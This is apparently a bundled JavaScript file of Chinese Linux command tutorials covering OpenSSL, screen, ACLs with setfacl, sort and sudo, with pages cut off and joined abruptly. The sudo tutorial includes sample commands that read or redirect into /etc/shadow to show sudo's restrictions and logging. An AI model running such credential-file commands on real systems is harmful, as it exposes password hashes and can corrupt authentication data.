\"<p><strong>OpenSSL</strong>是一个强大的安全套接字层密码库，囊括主要的密码算法、常用的密钥和证书封装管理功能及SSL协议，并提供丰富的应用程序供测试或其它目的使用。在OpenSSL被曝出现严重安全漏洞后，发现多数通过SSL协议加密的网站使用名为OpenSSL的开源软件包。由于这是互联网应用最广泛的安全传输方法，被网银、在线支付、电商网站、门户网站、电子邮件等重要网站广泛使用，所以该漏洞影响范围广大。</p>\\n<p>OpenSSL有两种运行模式：交互模式和批处理模式。</p>\\n<p>直接输入openssl回车进入交互模式，输入带命令选项的openssl进入批处理模式。</p>\\n<p>OpenSSL整个软件包大概可以分成三个主要的功能部分：密码算法库、SSL协议库以及应用程序。OpenSSL的目录结构自然也是围绕这三个功能部分进行规划的。 </p>\\n<p><strong>对称加密算法</strong></p>\\n<p>OpenSSL一共提供了8种对称加密算法，其中7种是分组加密算法，仅有的一种流加密算法是RC4。这7种分组加密算法分别是AES、DES、Blowfish、CAST、IDEA、RC2、RC5，都支持电子密码本模式（ECB）、加密分组链接模式（CBC）、加密反馈模式（CFB）和输出反馈模式（OFB）四种常用的分组密码加密模式。其中，AES使用的加密反馈模式（CFB）和输出反馈模式（OFB）分组长度是128位，其它算法使用的则是64位。事实上，DES算法里面不仅仅是常用的DES算法，还支持三个密钥和两个密钥3DES算法。 </p>\\n<p><strong>非对称加密算法</strong></p>\\n<p>OpenSSL一共实现了4种非对称加密算法，包括DH算法、RSA算法、DSA算法和椭圆曲线算法（EC）。DH算法一般用户密钥交换。RSA算法既可以用于密钥交换，也可以用于数字签名，当然，如果你能够忍受其缓慢的速度，那么也可以用于数据加密。DSA算法则一般只用于数字签名。 </p>\\n<p><strong>信息摘要算法</strong></p>\\n<p>OpenSSL实现了5种信息摘要算法，分别是MD2、MD5、MDC2、SHA（SHA1）和RIPEMD。SHA算法事实上包括了SHA和SHA1两种信息摘要算法，此外，OpenSSL还实现了DSS标准中规定的两种信息摘要算法DSS和DSS1。 </p>\\n<p><strong>密钥和证书管理</strong></p>\\n<p>密钥和证书管理是PKI的一个重要组成部分，OpenSSL为之提供了丰富的功能，支持多种标准。 </p>\\n<p>首先，OpenSSL实现了ASN.1的证书和密钥相关标准，提供了对证书、公钥、私钥、证书请求以及CRL等数据对象的DER、PEM和BASE64的编解码功能。OpenSSL提供了产生各种公开密钥对和对称密钥的方法、函数和应用程序，同时提供了对公钥和私钥的DER编解码功能。并实现了私钥的PKCS#12和PKCS#8的编解码功能。OpenSSL在标准中提供了对私钥的加密保护功能，使得密钥可以安全地进行存储和分发。 </p>\\n<p>在此基础上，OpenSSL实现了对证书的X.509标准编解码、PKCS#12格式的编解码以及PKCS#7的编解码功能。并提供了一种文本数据库，支持证书的管理功能，包括证书密钥产生、请求产生、证书签发、吊销和验证等功能。 </p>\\n<p>事实上，OpenSSL提供的CA应用程序就是一个小型的证书管理中心（CA），实现了证书签发的整个流程和证书管理的大部分机制。</p>\\n<h3 id=\\\"-\\\">实例</h3>\\n<p><strong>1、消息摘要算法应用例子</strong></p>\\n<p>用SHA1算法计算文件<a

~]#\\n</code></pre><p><strong>创建一个新的窗口</strong></p>\\n<p>安装完成后，直接敲命令screen就可以启动它。但是这样启动的screen会话没有名字，实践上推荐为每个screen会话取一个名字，方便分辨：</p>\\n<pre><code>[root@TS-DEV ~]# screen -S david\\n</code></pre><p>screen启动后，会创建第一个窗口，也就是窗口No. 0，并在其中打开一个系统默认的shell，一般都会是bash。所以你敲入命令screen之后，会立刻又返回到命令提示符，仿佛什么也没有发生似的，其实你已经进入Screen的世界了。当然，也可以在screen命令之后加入你喜欢的参数，使之直接打开你指定的程序，例如：</p>\\n<pre><code>[root@TS-DEV ~]# screen vi david.txt\\n</code></pre><p>screen创建一个执行vi david.txt的单窗口会话，退出vi 将退出该窗口/会话。</p>\\n<p><strong>查看窗口和窗口名称</strong></p>\\n<p>打开多个窗口后，可以使用快捷键C-a w列出当前所有窗口。如果使用文本终端，这个列表会列在屏幕左下角，如果使用X环境下的终端模拟器，这个列表会列在标题栏里。窗口列表的样子一般是这样：</p>\\n<pre><code>0$ bash  1-$ bash  2*$ bash\\n</code></pre><p>这个例子中我开启了三个窗口，其中*号表示当前位于窗口2，-号表示上一次切换窗口时位于窗口1。</p>\\n<p>Screen默认会为窗口命名为编号和窗口中运行程序名的组合，上面的例子中窗口都是默认名字。练习了上面查看窗口的方法，你可能就希望各个窗口可以有不同的名字以方便区分了。可以使用快捷键C-a A来为当前窗口重命名，按下快捷键后，Screen会允许你为当前窗口输入新的名字，回车确认。</p>\\n<p><strong>会话分离与恢复</strong></p>\\n<p>你可以不中断screen窗口中程序的运行而暂时断开（detach）screen会话，并在随后时间重新连接（attach）该会话，重新控制各窗口中运行的程序。例如，我们打开一个screen窗口编辑/tmp/david.txt文件：</p>\\n<pre><code>[root@TS-DEV ~]# screen vi /tmp/david.txt\\n</code></pre><p>之后我们想暂时退出做点别的事情，比如出去散散步，那么在screen窗口键入C-a d，Screen会给出detached提示：</p>\\n<p>暂时中断会话</p>\\n<p><img src=\\\"https://philipding.github.io/linux-command/wp-content/uploads/2015/12/105052iyv.jpg\\\" alt=\\\"\\\"></p>\\n<p>半个小时之后回来了，找到该screen会话：</p>\\n<pre><code>[root@TS-DEV ~]# screen -ls\\n</code></pre><p><img src=\\\"https://philipding.github.io/linux-command/wp-content/uploads/2015/12/1050524wP.jpg\\\" alt=\\\"\\\"></p>\\n<p>重新连接会话：</p>\\n<pre><code>[root@TS-DEV ~]# screen -r 12865\\n</code></pre><p>一切都在。</p>\\n<p>当然，如果你在另一台机器上没有分离一个Screen会话，就无从恢复会话了。这时可以使用下面命令强制将这个会话从它所在的终端分离，转移到新的终端上来：</p>\\n<p><img src=\\\"https://philipding.github.io/linux-command/wp-content/uploads/2015/12/1050528Fl.jpg\\\" alt=\\\"\\\"></p>\\n<p><strong>清除dead 会话</strong></p>\\n<p>如果由于某种原因其中一个会话死掉了（例如人为杀掉该会话），这时screen -list会显示该会话为dead状态。使用screen -wipe命令清除该会话：</p>\\n<p><img src=\\\"https://philipding.github.io/linux-command/wp-content/uploads/2015/12/105053LNE.jpg\\\" alt=\\\"\\\"></p>\\n<p><strong>关闭或杀死窗口</strong></p>\\n<p>正常情况下，当你退出一个窗口中最后一个程序（通常是bash）后，这个窗口就关闭了。另一个关闭窗口的方法是使用C-a k，这个快捷键杀死当前的窗口，同时也将杀死这个窗口中正在运行的进程。</p>\\n<p>如果一个Screen会话中最后一个窗口被关闭了，那么整个Screen会话也就退出了，screen进程会被终止。</p>\\n<p>除了依次退出/杀死当前Screen会话中所有窗口这种方法之外，还可以使用快捷键C-a :，然后输入quit命令退出Screen会话。需要注意的是，这样退出会杀死所有窗口并退出其中运行的所有程序。其实C-a :这个快捷键允许用户直接输入的命令有很多，包括分屏可以输入<a href=\\\"https://philipding.github.io/linux-command/split\\\" title=\\\"split命令\\\">split</a>等，这也是实现Screen功能的一个途径，不过个人认为还是快捷键比较方便些。</p>\\n<h3 id=\\\"screen-\\\">screen 高级应用</h3>\\n<p><strong>会话共享</strong></p>\\n<p>还有一种比较好玩的会话恢复，可以实现会话共享。假设你在和朋友在不同地点以相同用户登录一台机器，然后你创建一个screen会话，你朋友可以在他的终端上命令：</p>\\n<pre><code>[root@TS-DEV ~]# screen -x\\n</code></pre><p>这个命令会将你朋友的终端Attach到你的Screen会话上，并且你的终端不会被Detach。这样你就可以和朋友共享同一个会话了，如果你们当前又处于同一个窗口，那就相当于坐在同一个显示器前面，你的操作会同步演示给你朋友，你朋友的操作也会同步演示给你。当然，如果你们切换到这个会话的不同窗口中去，那还是可以分别进行不同的操作的。</p>\\n<p><strong>会话锁定与解锁</strong></p>\\n<p>Screen允许使用快捷键C-a s锁定会话。锁定以后，再进行任何输入屏幕都不会再有反应了。但是要注意虽然屏幕上看不到反应，但你的输入都会被Screen中的进程接收到。快捷键C-a q可以解锁一个会话。</p>\\n<p>也可以使用C-a x锁定会话，不同的是这样锁定之后，会话会被Screen所属用户的密码保护，需要输入密码才能继续访问这个会话。</p>\\n<p><strong>发送命令到screen会话</strong></p>\\n<p>在Screen会话之外，可以通过screen命令操作一个Screen会话，这也为使用Screen作为脚本程序增加了便利。关于Screen在脚本中的应用超出了入门的范围，这里只看一个例子，体会一下在会话之外对Screen的操作：</p>\\n<pre><code>[root@TS-DEV ~]# screen -S sandy -X screen [ping](https://philipding.github.io/linux-command/ping &quot;ping命令&quot;) www.baidu.com\\n</code></pre><p>这个命令在一个叫做sandy的screen会话中创建一个新窗口，并在其中运行ping命令。</p>\\n<p><strong>屏幕分割</strong></p>\\n<p>现在显示器那么大，将一个屏幕分割成不同区域显示不同的Screen窗口显然是个很酷的事情。可以使用快捷键C-a S将显示器水平分割，Screen 4.00.03版本以后，也支持垂直分屏，快捷键是C-a |。分屏以后，可以使用C-a <tab>在各个区块间切换，每一区块上都可以创建窗口并在其中运行进程。</p>\\n<p>可以用C-a X快捷键关闭当前焦点所在的屏幕区块，也可以用C-a Q关闭除当前区块之外其他的所有区块。关闭的区块中的窗口并不会关闭，还可以通过窗口切换找到它。</p>\\n<p><img src=\\\"https://philipding.github.io/linux-command/wp-content/uploads/2015/12/1050538zX.jpg\\\" alt=\\\"\\\"></p>\\n<p><strong>C/P模式和操作</strong></p>\\n<p>screen的另一个很强大的功能就是可以在不同窗口之间进行复制粘贴了。使用快捷键C-a <Esc>或者C-a [可以进入copy/paste模式，这个模式下可以像在vi中一样移动光标，并可以使用空格键设置标记。其实在这个模式下有很多类似vi的操作，譬如使用/进行搜索，使用y快速标记一行，使用w快速标记一个单词等。关于C/P模式下的高级操作，其文档的这一部分有比较详细的说明。</p>\\n<p>一般情况下，可以移动光标到指定位置，按下空格设置一个开头标记，然后移动光标到结尾位置，按下空格设置第二个标记，同时会将两个标记之间的部分储存在copy/paste buffer中，并退出copy/paste模式。在正常模式下，可以使用快捷键C-a ]将储存在buffer中的内容粘贴到当前窗口。</p>\\n<p><img src=\\\"https://philipding.github.io/linux-command/wp-content/uploads/2015/12/105054so0.jpg\\\" alt=\\\"\\\"></p>\\n<p><strong>更多screen功能</strong></p>\\n<p>同大多数UNIX程序一样，GNU Screen提供了丰富强大的定制功能。你可以在Screen的默认两级配置文件/etc/screenrc和$HOME/.screenrc中指定更多，例如设定screen选项，定制绑定键，设定screen会话自启动窗口，启用多用户模式，定制用户访问权限控制等等。如果你愿意的话，也可以自己指定screen配置文件。</p>\\n<p>以多用户功能为例，screen默认是以单用户模式运行的，你需要在配置文件中指定multiuser on 来打开多用户模式，通过acl*（acladd,acldel,aclchg...）命令，你可以灵活配置其他用户访问你的screen会话。更多配置文件内容请参考screen的<a href=\\\"https://philipding.github.io/linux-command/man\\\"

href=\\\"https://philipding.github.io/linux-command/man\\\" title=\\\"man命令\\\">man</a> page上摘下来虽然有些枯燥,但是对于理解下面的内容还是很有帮助的。</p>\\n<p>ACL是由一系列的Access Entry所组成的，每一条Access Entry定义了特定的类别可以对文件拥有的操作权限。Access Entry有三个组成部分：Entry tag <a href=\\\"https://philipding.github.io/linux-command/type\\\" title=\\\"type命令\\\">type</a>, qualifier (optional), permission。</p>\\n<p>我们先来看一下最重要的Entry tag type，它有以下几个类型：</p>\\n<pre><code>ACL_USER_OBJ：相当于Linux里file_owner的permission\\nACL_USER：定义了额外的用户可以对此文件拥有的permission\\nACL_GROUP_OBJ：相当于Linux里group的permission\\nACL_GROUP：定义了额外的组可以对此文件拥有的permission\\nACL_MASK：定义了ACL_USER, ACL_GROUP_OBJ和ACL_GROUP的最大权限 (这个我下面还会专门讨论)\\nACL_OTHER：相当于Linux里other的permission\\n</code></pre><p>让我们来据个例子说明一下，下面我们就用getfacl命令来查看一个定义好了的ACL文件：</p>\\n<pre><code>[root@localhost ~]# getfacl ./test.txt\\n# file: test.txt\\n# owner: root\\n# group: admin\\nuser::rw-\\nuser:john:rw-\\ngroup::rw-\\ngroup:dev:r--\\nmask::rw- other::r--\\n</code></pre><p>前面三个以#开头的定义了文件名，file owner和group。这些信息没有太大的作用，接下来我们可以用<code>--omit-header</code>来省略掉。</p>\\n<pre><code>user::rw-       定义了ACL_USER_OBJ, 说明file owner拥有[read](https://philipding.github.io/linux-command/read &quot;read命令&quot;) and [write](https://philipding.github.io/linux-command/write &quot;write命令&quot;) permission\\nuser:john:rw-   定义了ACL_USER,这样用户john就拥有了对文件的读写权限,实现了我们一开始要达到的目的\\ngroup::rw-      定义了ACL_GROUP_OBJ,说明文件的group拥有read and write permission\\ngroup:dev:r--   定义了ACL_GROUP,使得dev组拥有了对文件的read permission\\nmask::rw-       定义了ACL_MASK的权限为read and write\\nother::r--      定义了ACL_OTHER的权限为read\\n</code></pre><p>从这里我们就可以看出ACL提供了我们可以定义特定用户和用户组的功能，那么接下来我们就来看一下如何设置一个文件的ACL：</p>\\n<p><strong>如何设置ACL文件</strong></p>\\n<p>首先我们还是要讲一下设置ACL文件的格式，从上面的例子中我们可以看到每一个Access Entry都是由三个被：号分隔开的字段所组成，第一个就是Entry tag type。</p>\\n<pre><code>user   对应了ACL_USER_OBJ和ACL_USER\\ngroup  对应了ACL_GROUP_OBJ和ACL_GROUP\\nmask   对应了ACL_MASK\\nother  对应了ACL_OTHER\\n</code></pre><p>第二个字段称之为qualifier，也就是上面例子中的john和dev组，它定义了特定用户和拥护组对于文件的权限。这里我们也可以发现只有user和group才有qualifier，其他的都为空。第三个字段就是我们熟悉的permission了。它和Linux的permission一样定义，这里就不多讲了。</p>\\n<p>下面我们就来看一下怎么设置test.txt这个文件的ACL让它来达到我们上面的要求。</p>\\n<p>一开始文件没有ACL的额外属性：</p>\\n<pre><code>[root@localhost ~]# [ls](https://philipding.github.io/linux-command/ls &quot;ls命令&quot;) -l\\n-rw-rw-r-- 1 root admin 0 Jul 3 22:06 test.txt\\n\\n[root@localhost ~]# getfacl --omit-header ./test.txt\\nuser::rw- group::rw- other::r--\\n</code></pre><p>我们先让用户john拥有对test.txt文件的读写权限：</p>\\n<pre><code>[root@localhost ~]# setfacl -m user:john:rw- ./test.txt\\n[root@localhost ~]# getfacl --omit-header ./test.txt\\nuser::rw-\\nuser:john:rw-\\ngroup::rw-\\nmask::rw-\\nother::r--\\n</code></pre><p>这时我们就可以看到john用户在ACL里面已经拥有了对文件的读写权。这个时候如果我们查看一下linux的permission我们还会发现一个不一样的地方。</p>\\n<pre><code>[root@localhost ~]# ls -l ./test.txt\\n-rw-rw-r--+ 1 root admin 0 Jul 3 22:06 ./test.txt\\n</code></pre><p>在文件permission的最后多了一个+号，当任何一个文件拥有了ACL_USER或者ACL_GROUP的值以后我们就可以称它为ACL文件，这个+号就是用来提示我们的。我们还可以发现当一个文件拥有了<code>ACL_USER</code>或者<code>ACL_GROUP</code>的值时<code>ACL_MASK</code>同时也会被定义。</p>\\n<p>接下来我们来设置dev组拥有read permission：</p>\\n<pre><code>[root@localhost ~]# setfacl -m group:dev:r-- ./test.txt\\n[root@localhost ~]# getfacl --omit-header ./test.txt\\nuser::rw-\\nuser:john:rw-\\ngroup::rw-\\ngroup:dev:r--\\nmask::rw-\\nother::r--\\n</code></pre><p>到这里就完成了我们上面讲到的要求，是不是很简单呢。</p>\\n<p><strong>ACL_MASK和Effective permission</strong></p>\\n<p>这里需要重点讲一下<code>ACL_MASK</code>，因为这是掌握ACL的另一个关键，在Linux file permission里面大家都知道比如对于<code>rw-rw-r--</code>来说, 当中的那个<code>rw-</code>是指文件组的permission. 但是在ACL里面这种情况只是在<code>ACL_MASK</code>不存在的情况下成立。如果文件有ACL_MASK值，那么当中那个<code>rw-</code>代表的就是mask值而不再是group permission了。</p>\\n<p>让我们来看下面这个例子：</p>\\n<pre><code>[root@localhost ~]# ls -l\\n-rwxrw-r-- 1 root admin 0 Jul 3 23:10 test.sh\\n</code></pre><p>这里说明test.sh文件只有file owner: root拥有read, write, execute/search permission。admin组只有read and write permission，现在我们想让用户john也对test.sh具有和root一样的permission。</p>\\n<pre><code>[root@localhost ~]# setfacl -m user:john:rwx ./test.sh\\n[root@localhost ~]# getfacl --omit-header ./test.sh\\nuser::rwx user:john:rwx\\ngroup::rw-\\nmask::rwx\\nother::r--\\n</code></pre><p>这里我们看到john已经拥有了rwx的permission，mask值也被设定为rwx，那是因为它规定了<code>ACL_USER</code>，<code>ACL_GROUP</code>和<code>ACL_GROUP_OBJ</code>的最大值，现在我们再来看test.sh的Linux permission，它已经变成了：</p>\\n<pre><code>[root@localhost ~]# ls -l\\n-rwxrwxr--+ 1 root admin 0 Jul 3 23:10 test.sh\\n</code></pre><p>那么如果现在admin组的用户想要执行test.sh的程序会发生什么情况呢？它会被permission deny。原因在于实际上admin组的用户只有read and write permission，这里当中显示的rwx是<code>ACL_MASK</code>的值而不是group的permission。</p>\\n<p>所以从这里我们就可以知道，如果一个文件后面有+标记，我们都需要用getfacl来确认它的permission，以免发生混淆。</p>\\n<p>下面我们再来继续看一个例子，假如现在我们设置test.sh的mask为read only，那么admin组的用户还会有write permission吗？</p>\\n<pre><code>[root@localhost ~]# setfacl -m mask::r-- ./test.sh\\n[root@localhost ~]# getfacl --omit-header ./test.sh\\nuser::rwx\\nuser:john:rwx   #effective:r--\\ngroup::rw-      #effective:r--\\nmask::r--\\nother::r--\\n</code></pre><p>这时候我们可以看到ACL_USER和ACL_GROUP_OBJ旁边多了个#effective:r--，这是什么意思呢？让我们再来回顾一下<code>ACL_MASK</code>的定义。它规定了<code>ACL_USER</code>，<code>ACL_GROUP_OBJ</code>和<code>ACL_GROUP</code>的最大权限。那么在我们这个例子中他们的最大权限也就是read only。虽然我们这里给<code>ACL_USER</code>和<code>ACL_GROUP_OBJ</code>设置了其他权限，但是他们真正有效果的只有read权限。</p>\\n<p>这时我们再来查看test.sh的Linux file permission时它的group permission也会显示其mask的值(i.e. r--)</p>\\n<pre><code>[root@localhost ~]# ls -l\\n-rwxr--r--+ 1 root admin 0 Jul 3 23:10 test.sh\\n</code></pre><p><strong>Default ACL</strong></p>\\n<p>上面我们所有讲的都是Access ACL，也就是对文件而言。下面我简单讲一下Default ACL。Default ACL是指对于一个目录进行Default ACL设置，并且在此目录下建立的文件都将继承此目录的ACL。</p>\\n<p>同样我们来做一个试验说明，比如现在root用户建立了一个dir目录：</p>\\n<pre><code>[root@localhost ~]# [mkdir](https://philipding.github.io/linux-command/mkdir &quot;mkdir命令&quot;) dir\\n</code></pre><p>他希望所有在此目录下建立的文件都可以被john用户所访问，那么我们就应该对dir目录设置Default ACL。</p>\\n<pre><code>[root@localhost ~]# setfacl -d -m user:john:rw ./dir\\n[root@localhost ~]# getfacl --omit-header ./dir\\nuser::rwx\\ngroup::rwx\\nother::r-x\\ndefault:user::rwx\\ndefault:user:john:rwx\\ndefault:group::rwx\\ndefault:mask::rwx\\ndefault: other::r-x\\n</code></pre><p>这里我们可以看到ACL定义了default选项，john用户拥有了default的read, write, excute/search permission。所有没有定义的default都将从file permission里copy过来，现在root用户在dir下建立一个test.txt文件。</p>\\n<pre><code>[root@localhost ~]# [touch](https://philipding.github.io/linux-command/touch &quot;touch命令&quot;) ./dir/test.txt\\n[root@localhost ~]# ls -l ./dir/test.txt\\n-rw-rw-r--+ 1 root root 0 Jul 3 23:46 ./dir/test.txt\\n\\n[root@localhost ~]# getfacl --omit-header ./dir/test.txt\\nuser::rw-\\nuser:john:rw-\\ngroup::rwx #effective:rw-\\nmask::rw-\\nother::r--\\n</code></pre><p>这里我们看到在dir下建立的文件john用户自动就有了read and write permission，</p>\\n<p><strong>ACL相关命令</strong></p>\\n<p>前面的例子中我们都注意到了getfacl命令是用来读取文件的ACL，setfacl是用来设定文件的Acess ACL。这里还有一个chacl是用来改变文件和目录的Access ACL and Default ACL，它的具体参数大家可以去看man page。我只想提及一下<code>chacl -B</code>。它可以彻底删除文件或者目录的ACL属性(包括Default ACL)，比如你即使用了<code>setfacl -x</code>删除了所有文件的ACL属性，那个+号还是会出现在文件的末尾，所以正确的删除方法应该是用<code>chacl -B</code>用<a href=\\\"https://philipding.github.io/linux-command/cp\\\" title=\\\"cp命令\\\">cp</a>来复制文件的时候我们现在可以加上<code>-p</code>选项。这样在拷贝文件的时候也将拷贝文件的ACL属性，对于不能拷贝的ACL属性将给出警告。</p>\\n<p><a href=\\\"https://philipding.github.io/linux-command/mv\\\" title=\\\"mv命令\\\">mv</a>命令将会默认地移动文件的ACL属性，同样如果操作不允许的情况下会给出警告。</p>\\n<p><strong>需要注意的几点</strong></p>\\n<p>如果你的文件系统不支持ACL的话，你也许需要重新<a href=\\\"https://philipding.github.io/linux-command/mount\\\" title=\\\"mount命令\\\">mount</a>你的file system：</p>\\n<pre><code>mount -o remount, acl [mount point]\\n</code></pre><p>如果用<a href=\\\"https://philipding.github.io/linux-command/chmod\\\" title=\\\"chmod命令\\\">chmod</a>命令改变Linux file permission的时候相应的ACL值也会改变，反之改变ACL的值，相应的file permission也会改变。</p>\\n\";\n\n\n//////////////////\n// WEBPACK FOOTER\n// ./command/setfacl.md\n// module id = 440\n// module chunks = 0","module.exports =

-n是按照数字大小排序，-r是以相反顺序，-k是指定需要爱排序的栏位，-t指定栏位分隔符为冒号\\n</code></pre><p><strong>-k选项的具体语法格式：</strong></p>\\n<p>-k选项的语法格式：</p>\\n<pre><code>FStart.CStart Modifie,FEnd.CEnd Modifier\\n-------Start--------,-------End--------\\n FStart.CStart 选项  ,  FEnd.CEnd 选项\\n</code></pre><p>这个语法格式可以被其中的逗号<code>,</code>分为两大部分，<strong>Start</strong>部分和<strong>End</strong>部分。Start部分也由三部分组成，其中的Modifier部分就是我们之前说过的类似n和r的选项部分。我们重点说说<code>Start</code>部分的<code>FStart</code>和<code>C.Start</code>。<code>C.Start</code>也是可以省略的，省略的话就表示从本域的开头部分开始。<code>FStart.CStart</code>，其中<code>FStart</code>就是表示使用的域，而<code>CStart</code>则表示在<code>FStart</code>域中从第几个字符开始算“排序首字符”。同理，在End部分中，你可以设定<code>FEnd.CEnd</code>，如果你省略<code>.CEnd</code>，则表示结尾到“域尾”，即本域的最后一个字符。或者，如果你将CEnd设定为0(零)，也是表示结尾到“域尾”。</p>\\n<p>从公司英文名称的第二个字母开始进行排序：</p>\\n<pre><code>$ sort -t &#39; &#39; -k 1.2 facebook.txt\\nbaidu 100 5000\\nsohu 100 4500\\ngoogle 110 5000\\nguge 50 3000\\n</code></pre><p>使用了<code>-k 1.2</code>，表示对第一个域的第二个字符开始到本域的最后一个字符为止的字符串进行排序。你会发现baidu因为第二个字母是a而名列榜首。sohu和 google第二个字符都是o，但sohu的h在google的o前面，所以两者分别排在第二和第三。guge只能屈居第四了。</p>\\n<p>只针对公司英文名称的第二个字母进行排序，如果相同的按照员工工资进行降序排序：</p>\\n<pre><code>$ sort -t &#39; &#39; -k 1.2,1.2 -nrk 3,3 facebook.txt\\nbaidu 100 5000\\ngoogle 110 5000\\nsohu 100 4500\\nguge 50 3000\\n</code></pre><p>由于只对第二个字母进行排序，所以我们使用了<code>-k 1.2,1.2</code>的表示方式，表示我们“只”对第二个字母进行排序。（如果你问“我使用<code>-k 1.2</code>怎么不行？”，当然不行，因为你省略了End部分，这就意味着你将对从第二个字母起到本域最后一个字符为止的字符串进行排序）。对于员工工资进行排 序，我们也使用了<code>-k 3,3</code>，这是最准确的表述，表示我们“只”对本域进行排序，因为如果你省略了后面的3，就变成了我们“对第3个域开始到最后一个域位置的内容进行排序” 了。</p>\\n\";\n\n\n//////////////////\n// WEBPACK FOOTER\n// ./command/sort.md\n// module id = 454\n// module chunks = 0","module.exports =

href=\\\"https://philipding.github.io/linux-command/vi\\\" title=\\\"vi命令\\\">vi</a>里打开配置文件，用vi来修改文件。我们可以在编译时修改这个默认项。visudo不会擅自保存带有语法错误的配置文件，它会提示你出现的问题，并询问该如何处理，就像：</p>\\n<pre><code>&gt;&gt;&gt; sudoers [file](https://philipding.github.io/linux-command/file &quot;file命令&quot;): syntax error, line 22 &lt;&lt;\\n</code></pre><p>此时我们有三种选择：键入“e”是重新编辑，键入“x”是不保存退出，键入“Q”是退出并保存。如果真选择Q，那么sudo将不会再运行，直到错误被纠正。</p>\\n<p>现在，我们一起来看一下神秘的配置文件，学一下如何编写它。让我们从一个简单的例子开始：让用户Foobar可以通过sudo执行所有root可执行的命令。以root身份用visudo打开配置文件，可以看到类似下面几行：</p>\\n<pre><code># Runas [alias](https://philipding.github.io/linux-command/alias &quot;alias命令&quot;) specification\\n# User privilege specificationroot    ALL=(ALL)ALL\\n</code></pre><p>我们一看就明白个差不多了，root有所有权限，只要仿照现有root的例子就行，我们在下面加一行（最好用tab作为空白）：</p>\\n<pre><code>foobar ALL=(ALL)    ALL\\n</code></pre><p>保存退出后，切换到foobar用户，我们用它的身份执行命令：</p>\\n<pre><code>[foobar@localhost ~]$ [ls](https://philipding.github.io/linux-command/ls &quot;ls命令&quot;) /root\\nls: /root: 权限不够\\n\\n[foobar@localhost ~]$ sudo ls /root\\nPassWord:\\nanaconda-ks.cfg Desktop [install](https://philipding.github.io/linux-command/install &quot;install命令&quot;).log install.log.syslog\\n</code></pre><p>好了，我们限制一下foobar的权利，不让他为所欲为。比如我们只想让他像root那样使用ls和<a href=\\\"https://philipding.github.io/linux-command/ifconfig\\\" title=\\\"ifconfig命令\\\">ifconfig</a>，把那一行改为：</p>\\n<pre><code>foobar localhost=    /sbin/ifconfig,   /bin/ls\\n</code></pre><p>再来执行命令：</p>\\n<pre><code>[foobar@localhost ~]$ sudo [head](https://philipding.github.io/linux-command/head &quot;head命令&quot;) -5 /etc/shadow\\nPassword:\\nSorry, user foobar is not allowed to execute &#39;/usr/bin/head -5 /etc/shadow&#39; [as](https://philipding.github.io/linux-command/as &quot;as命令&quot;) root on localhost.localdomain.\\n\\n[foobar@localhost ~]$ sudo /sbin/ifconfigeth0      Linkencap:Ethernet HWaddr 00:14:85:EC:E9:9B...\\n</code></pre><p>现在让我们来看一下那三个ALL到底是什么意思。第一个ALL是指网络中的主机，我们后面把它改成了主机名，它指明foobar可以在此主机上执行后面的命令。第二个括号里的ALL是指目标用户，也就是以谁的身份去执行命令。最后一个ALL当然就是指命令名了。例如，我们想让foobar用户在linux主机上以jimmy或rene的身份执行<a href=\\\"https://philipding.github.io/linux-command/kill\\\" title=\\\"kill命令\\\">kill</a>命令，这样编写配置文件：</p>\\n<pre><code>foobar    linux=(jimmy,rene)    /bin/kill\\n</code></pre><p>但这还有个问题，foobar到底以jimmy还是rene的身份执行？这时我们应该想到了<code>sudo -u</code>了，它正是用在这种时候。 foobar可以使用<code>sudo -u jimmy kill PID</code>或者<code>sudo -u rene kill PID</code>，但这样挺麻烦，其实我们可以不必每次加<code>-u</code>，把rene或jimmy设为默认的目标用户即可。再在上面加一行：</p>\\n<pre><code>Defaults:foobar    runas_default=rene\\n</code></pre><p>Defaults后面如果有冒号，是对后面用户的默认，如果没有，则是对所有用户的默认。就像配置文件中自带的一行：</p>\\n<pre><code>Defaults    env_reset\\n</code></pre><p>另一个问题是，很多时候，我们本来就登录了，每次使用sudo还要输入密码就显得烦琐了。我们可不可以不再输入密码呢？当然可以，我们这样修改配置文件：</p>\\n<pre><code>foobar localhost=NOPASSWD:     /bin/[cat](https://philipding.github.io/linux-command/cat &quot;cat命令&quot;), /bin/ls\\n</code></pre><p>再来sudo一下：</p>\\n<pre><code>[foobar@localhost ~]$ sudo ls /rootanaconda-ks.cfg Desktop install.log\\ninstall.log.syslog\\n</code></pre><p>当然，你也可以说“某些命令用户foobar不可以运行”，通过使用!操作符，但这不是一个好主意。因为，用!操作符来从ALL中“剔出”一些命令一般是没什么效果的，一个用户完全可以把那个命令拷贝到别的地方，换一个名字后再来运行。</p>\\n<p><strong>日志与安全</strong></p>\\n<p>sudo为安全考虑得很周到，不仅可以记录日志，还能在有必要时向系统管理员报告。但是，sudo的日志功能不是自动的，必须由管理员开启。这样来做：</p>\\n<pre><code>[touch](https://philipding.github.io/linux-command/touch &quot;touch命令&quot;) /var/log/sudo\\nvi /etc/syslog.conf\\n</code></pre><p>在syslog.conf最后面加一行（必须用tab分割开）并保存：</p>\\n<pre><code>local2.debug                    /var/log/sudo\\n</code></pre><p>重启日志守候进程，</p>\\n<pre><code>[ps](https://philipding.github.io/linux-command/ps &quot;ps命令&quot;) aux [grep](https://philipding.github.io/linux-command/grep &quot;grep命令&quot;) syslogd\\n</code></pre><p>把得到的syslogd进程的PID（输出的第二列是PID）填入下面：</p>\\n<pre><code>kill –HUP PID\\n</code></pre><p>这样，sudo就可以写日志了：</p>\\n<pre><code>[foobar@localhost ~]$ sudo ls /rootanaconda-ks.cfg\\nDesktop install.log\\ninstall.log.syslog\\n$cat /var/log/sudoJul 28 22:52:54 localhost sudo:   foobar :\\nTTY=pts/1 ; [pwd](https://philipding.github.io/linux-command/pwd &quot;pwd命令&quot;)=/home/foobar ; USER=root ; [command](https://philipding.github.io/linux-command/command &quot;command命令&quot;)=/bin/ls /root\\n</code></pre><p>不过，有一个小小的“缺陷”，sudo记录日志并不是很忠实：</p>\\n<pre><code>[foobar@localhost ~]$ sudo cat /etc/shadow &gt; /dev/null\\ncat /var/log/sudo...Jul 28 23:10:24 localhost sudo:   foobar : TTY=pts/1 ;\\nPWD=/home/foobar ; USER=root ; COMMAND=/bin/cat /etc/shadow\\n</code></pre><p>重定向没有被记录在案！为什么？因为在命令运行之前，shell把重定向的工作做完了，sudo根本就没看到重定向。这也有个好处，下面的手段不会得逞：</p>\\n<pre><code>[foobar@localhost ~]$ sudo ls /root &gt; /etc/shadowbash: /etc/shadow: 权限不够\\n</code></pre><p>sudo 